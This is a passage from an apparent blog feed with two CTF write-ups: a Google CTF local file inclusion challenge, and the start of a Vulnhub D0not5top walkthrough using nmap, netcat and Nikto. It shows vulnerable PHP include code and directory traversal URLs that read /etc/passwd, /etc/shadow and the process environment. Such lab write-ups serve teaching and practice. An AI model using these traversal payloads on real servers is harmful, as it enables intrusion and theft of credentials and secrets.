&lt;p&gt;Can it be a hint? Maybe the code is looking for a file in the server named just as in our input. If that's the case and code is not properly implemented, it can be vulnerable to &lt;b&gt;local file intrusion&lt;/b&gt; attack. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;LFI&lt;/b&gt; occurs, when programmer does not correctly sanitaze the page include, which allows an attack to inject directory traversal characters and get system information essential to further exploit the server. Here you can see an example of such &lt;b&gt;bad code&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'f'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As we now know the basics, let's try to get some files using this attack and see if it works. First one - &lt;b&gt;/etc/passwd&lt;/b&gt;. To get this working you have to enter ../../../../etc/passwd path in the input box, click submit and webpage will redirect you to the file. That's how we'll be trying to access this and other resources.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;https://mindreader.web.ctfcompetition.com/?f=..%2F..%2F..%2F..%2Fetc%2Fpasswd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, we got it! But what can we do with it, there's no flag here so we have to keep looking further. I came with idea to grab &lt;b&gt;/etc/shadow&lt;/b&gt; and then crack the passwords. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;https://mindreader.web.ctfcompetition.com/?f=..%2F..%2F..%2F..%2Fetc%2Fshadow

root:*:17324:0:99999:7:::
daemon:*:17324:0:99999:7:::
bin:*:17324:0:99999:7:::
sys:*:17324:0:99999:7:::
sync:*:17324:0:99999:7:::
games:*:17324:0:99999:7:::
man:*:17324:0:99999:7:::
lp:*:17324:0:99999:7:::
mail:*:17324:0:99999:7:::
news:*:17324:0:99999:7:::
uucp:*:17324:0:99999:7:::
proxy:*:17324:0:99999:7:::
www-data:*:17324:0:99999:7:::
backup:*:17324:0:99999:7:::
list:*:17324:0:99999:7:::
irc:*:17324:0:99999:7:::
gnats:*:17324:0:99999:7:::
nobody:*:17324:0:99999:7:::
systemd-timesync:*:17324:0:99999:7:::
systemd-network:*:17324:0:99999:7:::
systemd-resolve:*:17324:0:99999:7:::
systemd-bus-proxy:*:17324:0:99999:7:::&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But this didn't work out. We have to keep looking further, maybe in the &lt;b&gt;.bashrc&lt;/b&gt;? Any clues? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;https://mindreader.web.ctfcompetition.com/?f=..%2F..%2F..%2F..%2Fetc%2Fbash.bashrc

# System-wide .bashrc file for interactive bash(1) shells.

# To enable the settings / commands in this file for login shells as well,
# this file has to be sourced in /etc/profile.

# If not running interactively, don't do anything
[ -z &quot;$PS1&quot; ] &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; return

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z &quot;${debian_chroot:-}&quot; ] &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, overwrite the one in /etc/profile)
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '

# Commented out, don't overwrite xterm -T &quot;title&quot; -n &quot;icontitle&quot; by default.
# If this is an xterm set the title to user@host:dir
#case &quot;$TERM&quot; in
#xterm*|rxvt*)
#    PROMPT_COMMAND='echo -ne &quot;\033]0;${USER}@${HOSTNAME}: ${PWD}\007&quot;'
#    ;;
#*)
#    ;;
#esac

# enable bash completion in interactive shells
#if ! shopt -oq posix; then
#  if [ -f /usr/share/bash-completion/bash_completion ]; then
#    . /usr/share/bash-completion/bash_completion
#  elif [ -f /etc/bash_completion ]; then
#    . /etc/bash_completion
#  fi
#fi

# if the command-not-found package is installed, use it
if [ -x /usr/lib/command-not-found -o -x /usr/share/command-not-found/command-not-found ]; then
	function command_not_found_handle {
	        # check because c-n-f could've been removed in the meantime
                if [ -x /usr/lib/command-not-found ]; then
		   /usr/lib/command-not-found -- &quot;$1&quot;
                   return $?
                elif [ -x /usr/share/command-not-found/command-not-found ]; then
		   /usr/share/command-not-found/command-not-found -- &quot;$1&quot;
                   return $?
		else
		   printf &quot;%s: command not found\n&quot; &quot;$1&quot; &amp;gt;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;2
		   return 127
		fi
	}
fi&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Nope. When trying &lt;b&gt;proc/version&lt;/b&gt;, we get forbidden, so that's something new. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;https://mindreader.web.ctfcompetition.com/?f=..%2F..%2F..%2F..%2Fproc%2Fversion

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;403 Forbidden&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Forbidden&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;You don't have the permission to access the requested resource. It is either read-protected or not readable by the server.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Every file in &lt;b&gt;/proc&lt;/b&gt; seems to be protected. But after good (and educational!) few hours of looking, I've managed to find something in Linux man pages. Let's take a look at &lt;b&gt;/proc/[pid]/environ&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;/proc/[pid]/environ
       This file contains the initial environment that was set when
       the currently executing program was started via execve(2).
       The entries are separated by null bytes ('\0'), and there may
       be a null byte at the end.  Thus, to print out the environment
       of process 1, you would do:

           $ strings /proc/1/environ

       If, after an execve(2), the process modifies its environment
       (e.g., by calling functions such as putenv(3) or modifying the
       environ(7) variable directly), this file will not reflect
       those changes.

       Furthermore, a process may change the memory location that
       this file refers via prctl(2) operations such as
       PR_SET_MM_ENV_START.

       Permission to access this file is governed by a ptrace access
       mode PTRACE_MODE_READ_FSCREDS check; see ptrace(2).&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As enviroment can be very useful, I decided that that's the path I wanna go in this challenge. But as &lt;b&gt;/proc&lt;/b&gt; is forbidden, we have to find a different way. Here comes Stackoverflow to the rescue, let's look at this &lt;a href=&quot;https://unix.stackexchange.com/questions/18255/how-does-dev-fd-relate-to-proc-self-fd&quot;&gt;&lt;b&gt;thread&lt;/b&gt;&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;But trying &lt;b&gt;/dev/fd/environ&lt;/b&gt; is once again - not found. I have to be missing something. Let's rethink that - we use a symlink to get into &lt;b&gt;/proc/self/fd&lt;/b&gt;, and now we have to go back one directory and then jump to envrion. Got it! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;https://mindreader.web.ctfcompetition.com/?f=%2Fdev%2Ffd%2F..%2Fenviron

GAE_MEMORY_MB=614HOSTNAME=a2c5f45b98c8GAE_INSTANCE=aef-mindreader--sss6w3uqjfrcntmn-20170618t144344-8r7fPORT=8080HOME=/rootPYTHONUNBUFFERED=1GAE_SERVICE=mindreader-sss6w3uqjfrcntmnPATH=/env/bin:/opt/python3.5/bin:/opt/python3.6/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binGAE_DEPLOYMENT_ID=402060873983974243LANG=C.UTF-8DEBIAN_FRONTEND=noninteractiveGCLOUD_PROJECT=ctf-web-kuqo48dGOOGLE_CLOUD_PROJECT=ctf-web-kuqo48dCHALLENGE_NAME=mindreaderVIRTUAL_ENV=/envPWD=/home/vmagent/appGAE_VERSION=20170618t144344FLAG=CTF{ee02d9243ed6dfcf83b8d520af8502e1}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And along with the environ, there's a hidden flag! &lt;/p&gt;
</description>
        <pubDate>Mon, 19 Jun 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/googlectf-mindreader/</link>
        <guid isPermaLink="true">http://localhost:4000/googlectf-mindreader/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - D0not5top 1.2</title>
        <description>&lt;p&gt;Today we're going to play with another machine from &lt;a href=&quot;&quot;&gt;Vulnhub&lt;/a&gt; called &lt;a href=&quot;https://www.vulnhub.com/entry/d0not5top-12,191/&quot;&gt;D0not5top&lt;/a&gt;. Our aim is to find all 7 flags, and root the box. It seems to be a little harder then the previous ones, but all we want is a good challenge, right? &lt;/p&gt;

&lt;h1&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;As we know that IP addess of this machine is &lt;b&gt;10.0.2.8&lt;/b&gt;, we can start by enumerating the machine for any open ports. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.0.2.8

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-06-08 13:32 EDT
NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:32
Completed NSE at 13:32, 0.00s elapsed
Initiating NSE at 13:32
Completed NSE at 13:32, 0.00s elapsed
Initiating ARP Ping Scan at 13:32
Scanning 10.0.2.8 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 13:32, 0.03s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Parallel DNS resolution of 1 host. at 13:32
Completed Parallel DNS resolution of 1 host. at 13:32, 6.52s elapsed
Initiating SYN Stealth Scan at 13:32
Scanning 10.0.2.8 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
Discovered open port 53/tcp on 10.0.2.8
Discovered open port 80/tcp on 10.0.2.8
Discovered open port 22/tcp on 10.0.2.8
Discovered open port 111/tcp on 10.0.2.8
Discovered open port 25/tcp on 10.0.2.8
Discovered open port 59418/tcp on 10.0.2.8
Completed SYN Stealth Scan at 13:32, 3.47s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 13:32
Scanning 6 services on 10.0.2.8
Completed Service scan at 13:32, 13.56s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.2.8&lt;/span&gt;
NSE: Script scanning 10.0.2.8.
Initiating NSE at 13:32
Completed NSE at 13:32, 8.77s elapsed
Initiating NSE at 13:32
Completed NSE at 13:32, 0.01s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.8
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00070s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65529 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   1024 a7:52:df:39:80:7c:66:16:2f:fd:f7:7b:80:13:09:85 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   2048 bf:d9:5a:22:54:91:cc:36:40:3c:e6:35:4f:8e:0c:78 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 16:e6:84:e1:5f:80:bc:27:6a:50:01:55:f0:c0:cc:72 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
25/tcp    open  smtp    Exim smtpd
| smtp-commands: D0Not5top Hello nmap.scanme.org &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.2.15], SIZE 52428800, 8BITMIME, PIPELINING, HELP,
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP
53/tcp    open  domain  PowerDNS 3.4.1
| dns-nsid:
|   NSID: D0Not5top &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;44304e6f7435746f70&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   id.server: D0Not5top
|_  bind.version: PowerDNS Authoritative Server 3.4.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jenkins@autotest.powerdns.com built 20170111224403 root@x86-csail-01.debian.org&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp    open  http    Apache httpd
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 22 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| /games /dropbox /contact /blog/wp-login.php
| /blog/wp-admin /search /support/search.php
| /extend/plugins/search.php /plugins/search.php /extend/themes/search.php
|_/themes/search.php /support/rss /archive/ /wp-admin/ /wp-content/
|_http-server-header: Apache
|_http-title: Site doesnt have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/html&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
111/tcp   open  rpcbind 2-4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100000)&lt;/span&gt;
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          36778/udp  status
|_  100024  1          59418/tcp  status
59418/tcp open  status  1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100024)&lt;/span&gt;
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          36778/udp  status
|_  100024  1          59418/tcp  status
MAC Address: 08:00:27:58:A4:C4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Uptime guess: 198.048 days &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;since Tue Nov 22 11:23:13 2016&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Network Distance: 1 hop
TCP Sequence Prediction: &lt;span class=&quot;nv&quot;&gt;Difficulty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;261 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Good luck!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
IP ID Sequence Generation: All zeros
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.70 ms 10.0.2.8

NSE: Script Post-scanning.
Initiating NSE at 13:32
Completed NSE at 13:32, 0.00s elapsed
Initiating NSE at 13:32
Completed NSE at 13:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;34.93 seconds
            Raw packets sent: 65558 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.885MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 65550 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.623MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, we have found a lot of information about the machine. I'll leave the &lt;b&gt;ssh&lt;/b&gt;, as we don't have much information to start from, but &lt;b&gt;smtp&lt;/b&gt; seems to be a good choice. &lt;/p&gt;

&lt;h1&gt;SMTP&lt;/h1&gt;

&lt;p&gt;Let's try and connect to it, maybe we'll be lucky to find some clues. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc 10.0.2.8 25
220 46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874 327231646434 717070756 5793437 347 3767879610a EXIM SMTP&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;A string in hexadecimal format? We can try to decode it using xxd tool. Option &lt;b&gt;-ps&lt;/b&gt; will make our output in plain hexdump style. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874 327231646434 717070756 5793437 347 3767879610a&quot;&lt;/span&gt; | xxd &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ps&lt;/span&gt;
FL46_3:29dryf67uheht2r1dd4qppuey474svxya&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Third flag already! But where are the first two?  &lt;/p&gt;

&lt;h1&gt;HTTP&lt;/h1&gt;

&lt;p&gt;In order to move on with this attack I decided to take a look at the website, hosted at port 80. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/d0not5top/website-1.png&quot; alt=&quot;First Look&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But there was nothing here, both in the source code and in the page itself. In order to try and find anything more, I decided to deploy an &lt;b&gt;Nikto&lt;/b&gt; scan. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.0.2.8
- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          10.0.2.8
+ Target Hostname:    10.0.2.8
+ Target Port:        80
+ Start Time:         2017-06-08 13:36:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: Apache
+ Server leaks inodes via ETags, header found with file /, fields: 0xd3 0x54c550ee22d56
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ OSVDB-3268: /games/: Directory indexing found.
+ Entry &lt;span class=&quot;s1&quot;&gt;'/games/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/dropbox/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/contact/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/search/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/archive/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/wp-admin/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/wp-content/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/wp-includes/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/comment-page-/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/trackback/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/xmlrpc.php'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/blackhole/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/mint/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/feed/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
